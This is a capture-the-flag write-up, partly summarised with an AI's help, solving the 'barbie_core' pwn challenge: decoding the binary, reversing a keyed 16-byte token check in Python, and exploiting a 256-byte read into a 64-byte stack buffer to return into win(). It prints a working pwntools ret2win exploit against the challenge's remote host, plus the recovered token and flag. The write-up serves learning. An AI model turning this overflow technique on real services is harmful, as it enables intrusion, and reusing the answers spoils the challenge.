
This question took a little bit time to solve and at some point i just skipped taking down notes so at the end i summarised this writeup with the help of Claude

---

## 1. Initial Triage

The provided file, `barbie_core.b64`, is plain ASCII text on a single line. Decoding it as Base64 reveals the ELF magic bytes (`\x7fELF`):

```bash
base64 -d barbie_core.b64 > barbie_core
file barbie_core
```

```
barbie_core: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=db0b82c3...,
for GNU/Linux 3.2.0, not stripped
```

Key facts:

- **Not stripped** — full symbol table is available, so function names are intact.
- **EXEC, not PIE** — all addresses are fixed at link time, no ASLR to defeat for code addresses.

A quick `strings` pass surfaces the program's theme and structure:

```
== Barbieland Glam Relay ==
Enter 16-byte glam calibration code:
code>
Calibration accepted.
Upload pilot profile packet:
pilot>
Packet stored.
Ancient message recovered: %s
FLAG_PATH
/flag.txt
```

And the symbol table reveals three interesting functions: `check_token`, `vulnerable_prompt`, and `win`.

## 2. Security Mitigations

```bash
readelf -h barbie_core | grep Type      # EXEC (non-PIE)
readelf -l barbie_core | grep -A1 GNU_STACK   # RW, no canary in prologue either
```

- No stack canary (`__stack_chk_fail` is absent from the symbol table, and the function prologues don't load/check one).
- No PIE — every function address (including `win`) is a known constant.
- These two facts together mean a classic, unmitigated stack buffer overflow with a known-address `win()` function is in play.

## 3. Program Flow (`main`)

`main` reads up to 64 bytes into a 64-byte stack buffer via `fgets` (this part is _not_ overflowable — size matches buffer exactly), strips the trailing newline, and passes it to `check_token()`. Only if `check_token()` returns non-zero does it call `vulnerable_prompt()`.

```c
fgets(buf, 0x40, stdin);
buf[strcspn(buf, "\n")] = 0;
if (check_token(buf)) {
    vulnerable_prompt();
}
```

## 4. Reversing `check_token`

`check_token` requires the input to be **exactly 16 bytes** (`strlen(input) != 16` → instant fail), then runs each byte through a keyed, stateful transformation and compares the result against a hardcoded 16-byte array `target.0` at `0x402150`:

```
5a 06 b5 86 17 08 8e ba d6 d4 d7 06 b7 96 38 ae
```

Reconstructed per-byte algorithm (state starts at `0x42`):

```c
uint8_t state = 0x42;
for (int i = 0; i < 16; i++) {
    uint8_t c = input[i];
    uint8_t rot = i % 5;                       // (div-by-5 magic constant in the asm)
    uint8_t rolled = rol8(state, rot);          // rotate state left by `rot` bits
    uint8_t addpart = (i * 7 + 0x5a) ^ c;
    uint8_t val = rolled + addpart;
    if (val != target[i]) return 0;             // fail
    state = (state * 33) ^ val;                 // state update for next round
}
return 1; // success
```

Note: my first pass at the disassembly misread the `imul 0x66666667 / shr 32 / sar 1` sequence as division by 10; checking the surrounding `shl 2; add` (×5 reconstruction) confirmed it's actually **division by 5**, making `rot = i % 5`. This is a good reminder to verify "magic number" divisions by reconstructing the _quotient_ arithmetic exactly, not just pattern-matching the constant.

### Reversing the cipher

Since `rol8`/the additive step is invertible step-by-step (each round's `state` update only depends on values already known), the algorithm can be run in reverse to recover the required input directly from `target[]`, without brute force:

```python
def rol8(x, r):
    r &= 7
    if r == 0:
        return x & 0xff
    x &= 0xff
    return ((x << r) | (x >> (8 - r))) & 0xff

target = bytes.fromhex("5a06b58617088ebad6d4d706b79638ae")
state = 0x42
out = bytearray(16)

for i in range(16):
    rot = i % 5
    rolled = rol8(state, rot)
    addpart = (i * 7 + 0x5a) & 0xff
    val = target[i]
    diff = (val - rolled) & 0xff
    c = diff ^ addpart
    out[i] = c
    state = ((state * 33) & 0xff) ^ val

print(out.decode())
```

**Result:** `B4RB13-C0R3GL4M!`

Forward-simulating the algorithm with this string against `target[]` confirms a byte-for-byte match — this is the correct calibration code.

## 5. The Real Bug: `vulnerable_prompt`

```c
void vulnerable_prompt(void) {
    char buf[0x40];           // 64-byte stack buffer
    puts("Upload pilot profile packet:");
    write(1, "pilot> ", 7);
    read(0, buf, 0x100);      // reads up to 256 bytes into a 64-byte buffer!
    puts("Packet stored.");
}
```

`read()` is called with a size of `0x100` (256) against a buffer that is only `0x40` (64) bytes on the stack — a textbook stack-based buffer overflow. Combined with the lack of a stack canary and the binary's fixed (non-PIE) addresses, this is directly exploitable to hijack the return address.

## 6. The Payoff: `win`

```c
void win(void) {
    char *path = getenv("FLAG_PATH");
    if (!path || !*path) path = "/flag.txt";
    FILE *f = fopen(path, "r");
    if (!f) { puts("Flag subsystem offline."); exit(1); }
    char buf[0x90];
    if (fgets(buf, 0x80, f))
        printf("Ancient message recovered: %s\n", buf);
    else
        puts("No message found.");
    fclose(f);
}
```

`win()` is never called by the normal control flow — it exists purely as a redirect target. It opens `$FLAG_PATH` (falling back to `/flag.txt`) and prints its contents.

## 7. Building the Exploit

Stack layout in `vulnerable_prompt`:

```
[ buf: 64 bytes ][ saved RBP: 8 bytes ][ return address: 8 bytes ]
```

Payload:

```python
payload  = b"A" * 0x40        # fill the 64-byte buffer
payload += b"B" * 8           # overwrite saved RBP (don't care about its value)
payload += p64(0x4013c3)      # overwrite return address with win()
```

Full exploit flow:

1. Send the recovered token `B4RB13-C0R3GL4M!` to satisfy `check_token`.
2. Once prompted for the pilot profile packet, send the 80-byte overflow payload above.
3. `vulnerable_prompt` returns into `win()` instead of back to `main`.
4. `win()` reads and prints the flag.

### `pwntools` exploit script

```python
from pwn import *

context.arch = 'amd64'

HOST, PORT = "162.243.193.61", 5000
TOKEN = b"B4RB13-C0R3GL4M!"
WIN_ADDR = 0x4013c3

io = remote(HOST, PORT)

io.recvuntil(b"code> ")
io.sendline(TOKEN)
io.recvuntil(b"Calibration accepted.")

io.recvuntil(b"pilot> ")
payload = b"A" * 0x40 + b"B" * 8 + p64(WIN_ADDR)
io.send(payload)

print(io.recvall(timeout=5).decode(errors="replace"))
io.close()
```

## 8. Local Verification

Before touching the remote service, the exploit was validated against a local copy of the binary with `FLAG_PATH` pointed at a dummy flag file:

```
== Barbieland Glam Relay ==
Enter 16-byte glam calibration code:
code> Calibration accepted.
Upload pilot profile packet:
pilot> Packet stored.
Ancient message recovered: osiris{test_flag_for_local_verification}
```

This confirmed both the token-recovery logic and the overflow offsets (`0x40` + `0x8`) before running against the live target.

## 9. Final Flag Output

```
[+] Opening connection to 162.243.193.61 on port 5000: Done  
[+] Token accepted  
[*] Payload sent, reading response...  
[+] Receiving all data: Done (75B)  
[*] Closed connection to 162.243.193.61 port 5000  
Packet stored.  
Ancient message recovered: bitctf{{b4rb13_buff3r_b10w0u7}}
```

Flag

```
bitctf{{b4rb13_buff3r_b10w0u7}}
```
